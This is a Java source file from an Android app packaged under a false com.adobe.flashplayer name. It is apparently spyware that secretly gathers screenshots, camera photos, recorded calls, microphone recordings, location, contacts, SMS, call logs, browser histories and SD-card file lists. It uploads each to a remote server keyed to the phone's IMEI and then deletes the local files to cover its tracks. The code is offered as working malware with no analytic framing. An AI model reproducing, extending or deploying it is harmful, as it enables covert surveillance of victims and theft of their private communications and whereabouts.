package com.adobe.flashplayer.data;

import java.io.File;
import java.io.FileInputStream;
import android.content.Context;
import android.util.Log;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;


public class UploadRemainder implements Runnable{

    private final String TAG = "[ljg]UploadRemainder ";

    private Context context;


    public UploadRemainder(Context context){
        this.context = context;
    }


    public void uploadOldFiles(String path){
        try{

            Log.e(TAG, "start");

            File pathfile = new File(path);
            if (pathfile.exists() == false) {
                return;
            }

            File[] subFiles = pathfile.listFiles();
            if (subFiles == null) {
                return;
            }

            for (File subFile : subFiles) {
                if(subFile.isFile() ){
                    if (subFile.getName().contains(Public.SCRNSNAPSHOT_FILE_NAME)) {

                        String filename = subFile.getName();
                        int filenamelen = filename.getBytes().length;
                        int filesize = (int)subFile.length();
                        int sendsize = filesize + 4 + filenamelen + 4;
                        byte[] sendbuf = new byte[sendsize];
                        byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                        System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                        System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
                        byte[] bytefilesize = Utils.intToBytes(filesize);
                        System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);

                        FileInputStream fin = new FileInputStream(subFile);
                        fin.read(sendbuf,4 + filenamelen + 4,filesize);
                        fin.close();

                        UploadData.upload(sendbuf,sendsize, Public.CMD_DATA_SCRNSNAPSHOT, Public.IMEI);
                        MyLog.writeLogFile("find history screensnapshot file:" + subFile.getName() + "\r\n");
                        subFile.delete();
                    }
                    else if (subFile.getName().contains(Public.CAMERAPHOTO_FILE_NAME)) {

                        String filename = subFile.getName();
                        int filenamelen = filename.getBytes().length;
                        int filesize = (int)subFile.length();
                        int sendsize = filesize + 4 + filenamelen + 4;
                        byte[] sendbuf = new byte[sendsize];
                        byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                        System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                        System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
                        byte[] bytefilesize = Utils.intToBytes(filesize);
                        System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);

                        FileInputStream fin = new FileInputStream(subFile);
                        fin.read(sendbuf,4 + filenamelen + 4,filesize);
                        fin.close();

                        UploadData.upload(sendbuf,sendsize, Public.CMD_DATA_CAMERAPHOTO, Public.IMEI);
                        MyLog.writeLogFile("find history cameraphoto file:" + subFile.getName() + "\r\n");
                        subFile.delete();
                    }
                    else if (subFile.getName().contains(Public.PHONECALLAUDIO_FILE_NAME) ) {
                        int filesize = (int)subFile.length();
                        int filenamelen = subFile.getName().getBytes().length;
                        int sendsize = filesize + 4 + filenamelen +4;
                        byte[] sendbuf = new byte[sendsize];
                        byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                        System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                        System.arraycopy(subFile.getName().getBytes(), 0, sendbuf, 4, filenamelen);
                        byte[] bytefilesize = Utils.intToBytes(filesize);
                        System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);

                        FileInputStream fin = new FileInputStream(subFile);
                        fin.read(sendbuf,4 + filenamelen + 4,filesize);
                        fin.close();

                        UploadData.upload(sendbuf,sendsize, Public.CMD_DATA_PHONECALLAUDIO, Public.IMEI);
                        MyLog.writeLogFile("find history phonecallaudio file:" + subFile.getName() + "\r\n");
                        subFile.delete();
                    }
                    else if (subFile.getName().contains(Public.LOCATION_FILE_NAME) ) {
                        int filesize = (int)subFile.length();
                        int sendsize = filesize;
                        byte[] sendbuf = new byte[sendsize];
                        FileInputStream fin = new FileInputStream(subFile);
                        fin.read(sendbuf,0,filesize);
                        fin.close();

                        UploadData.upload(sendbuf,sendsize, Public.CMD_DATA_LOCATION, Public.IMEI);
                        MyLog.writeLogFile("find location file:" + subFile.getName() + "\r\n");
                        subFile.delete();
                    }
                    else if (subFile.getName().contains(Public.MICAUDIORECORD_FILE_NAME) ) {
                        int filesize = (int)subFile.length();
                        int filenamelen = subFile.getName().getBytes().length;
                        int sendsize = filesize + 4 + filenamelen +4;
                        byte[] sendbuf = new byte[sendsize];
                        byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                        System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                        System.arraycopy(subFile.getName().getBytes(), 0, sendbuf, 4, filenamelen);
                        byte[] bytefilesize = Utils.intToBytes(filesize);
                        System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);

                        FileInputStream fin = new FileInputStream(subFile);
                        fin.read(sendbuf,4 + filenamelen + 4,filesize);
                        fin.close();

                        UploadData.upload(sendbuf,sendsize, Public.CMD_DATA_MICAUDIORECORD, Public.IMEI);
                        MyLog.writeLogFile("find history mic audio record file:" + subFile.getName() + "\r\n");
                        subFile.delete();
                    }else if (subFile.getName().contains(Public.DEVICEINFO_FILE_NAME) ||
                            subFile.getName().contains(Public.CONTACTS_FILE_NAME) ||
                            subFile.getName().contains(Public.MESSAGE_FILE_NAME) ||
                            subFile.getName().contains(Public.CALLLOG_FILE_NAME) ||
                            subFile.getName().contains(Public.WEBKITRECORD_FILE_NAME) ||
                            subFile.getName().contains(Public.CHROMEHISTORY_FILE_NAME) ||
                            subFile.getName().contains(Public.FIREFOXRECORD_FILE_NAME) ||
                            subFile.getName().contains(Public.APPPROCESS_FILE_NAME) ||
                            subFile.getName().contains(Public.SDCARDFILES_NAME) ||
                            subFile.getName().contains(Public.EXTCARDFILES_NAME)){

                        int cmd = 0;
                        if (subFile.getName().contains(Public.CONTACTS_FILE_NAME)) {
                            cmd = Public.CMD_DATA_CONTACTS;
                        }else if (subFile.getName().contains(Public.DEVICEINFO_FILE_NAME)) {
                            cmd = Public.CMD_DATA_DEVICEINFO;
                        }else if (subFile.getName().contains(Public.MESSAGE_FILE_NAME)) {
                            cmd = Public.CMD_DATA_MESSAGE;
                        }else if (subFile.getName().contains(Public.CALLLOG_FILE_NAME)) {
                            cmd = Public.CMD_DATA_CALLLOG;
                        }else if (subFile.getName().contains(Public.WEBKITRECORD_FILE_NAME)) {
                            cmd = Public.CMD_DATA_WEBKITHISTORY;
                        }else if (subFile.getName().contains(Public.CHROMEHISTORY_FILE_NAME)) {
                            cmd = Public.CMD_DATA_CHROMEHISTORY;
                        }else if (subFile.getName().contains(Public.FIREFOXRECORD_FILE_NAME)) {
                            cmd = Public.CMD_DATA_FIREFOXHISTORY;
                        }else if (subFile.getName().contains(Public.APPPROCESS_FILE_NAME)) {
                            cmd = Public.CMD_DATA_APPPROCESS;
                        }else if (subFile.getName().endsWith(Public.SDCARDFILES_NAME) &&
                                subFile.getName().endsWith(".tmp") == false) {
                            //NetworkLargeFile.SendNetworkLargeFile(subFile.getAbsolutePath(),Public.SERVER_IP_ADDRESS,
                            //		Public.SERVER_DATA_PORT,imei,ServiceThreadProc.CMD_DATA_SDCARDFILES,Public.PacketOptCompInFile);
                            cmd = Public.CMD_DATA_SDCARDFILES;
                        }else if (subFile.getName().endsWith(Public.EXTCARDFILES_NAME) &&
                                subFile.getName().endsWith(".tmp") == false) {
                            cmd = Public.CMD_DATA_EXTCARDFILES;
                            //NetworkLargeFile.SendNetworkLargeFile(subFile.getAbsolutePath(),Public.SERVER_IP_ADDRESS,
                            //		Public.SERVER_DATA_PORT,imei,ServiceThreadProc.CMD_DATA_EXTCARDFILES,Public.PacketOptCompInFile);
                        }
                        else if(subFile.getName().contains(Public.LOG_FILE_NAME)){
                            cmd = Public.CMD_UPLOAD_LOG;
                        }
                        else  {
                            continue;
                        }

                        int filesize = (int)subFile.length();
                        int sendsize = filesize;
                        byte[] sendbuf = new byte[sendsize];
                        FileInputStream fin = new FileInputStream(subFile);
                        fin.read(sendbuf,0,filesize);
                        fin.close();
                        UploadData.upload(sendbuf,sendsize, cmd, Public.IMEI);
                        MyLog.writeLogFile("find history file:" + subFile.getName() + "\r\n");
                        subFile.delete();
                    }
                }
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("sendHistoryDataFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }
    }


    public void run(){
        if( NetworkUitls.isNetworkAvailable(context) == false ){
            return;
        }

        if (Public.LOCAL_PATH_NAME.equals(Public.SDCARD_PATH_NAME) == false) {
            uploadOldFiles(Public.SDCARD_PATH_NAME);
            uploadOldFiles(Public.LOCAL_PATH_NAME);
        }else{
            uploadOldFiles(Public.LOCAL_PATH_NAME);
        }

        AppMessage.UploadAppMsgFile();
    }
}
